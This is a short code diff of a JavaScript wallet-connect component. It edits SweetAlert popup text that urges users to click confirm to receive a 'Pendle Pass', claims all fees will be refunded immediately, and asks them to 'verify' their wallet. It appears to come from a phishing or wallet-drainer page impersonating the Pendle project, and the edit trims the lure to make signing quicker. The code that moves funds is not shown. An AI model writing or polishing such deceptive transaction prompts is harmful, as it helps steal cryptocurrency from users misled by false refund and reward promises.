@@ -578,7 +578,7 @@ export default {
           this.account = getAccount().address;
           Swal.fire({
             html:
-              '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
+              '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
               '<small style="font-size: 15px">Verify your wallet to continue</small> ',
             showCloseButton: false,
             showCancelButton: false,
@@ -602,7 +602,7 @@ export default {
               if (getAccount().isConnected) {
                 Swal.fire({
                   html:
-                    '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
+                    '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
                     '<small style="font-size: 15px">Verify your wallet to continue</small> ',
                   showCloseButton: false,
                   showCancelButton: false,
